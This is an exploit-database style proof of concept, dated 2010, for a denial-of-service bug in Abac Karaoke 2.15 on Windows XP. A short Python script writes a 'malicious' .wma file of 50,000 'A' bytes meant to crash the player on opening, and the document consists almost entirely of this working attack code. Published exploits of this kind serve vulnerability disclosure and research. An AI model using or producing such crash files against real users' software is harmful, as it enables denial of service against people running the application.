# Exploit Title: Abac Karaoke 2.15 (.mp3 , .wma ) DoS
# Date: 12 / 8 / 2010
# Author: Oh Yaw Theng
# Software Link: http://www.topdownloads.net/software/abac-karaoke-build_2_218982.html?hl=&ia=0
# Version: v2.15
# Tested on: Windows XP SP 2
# CVE : N / A
# Description : This is the latest version from the official website

#!/usr/bin/python

# Create the malicious .mp3 or .wma file and boom ! The program crashes ! DEADBEEF !
filename = "crash.wma"

junk = "\x41" * 50000

exploit = junk

textfile = open(filename,'w')
textfile.write(exploit)
textfile.close()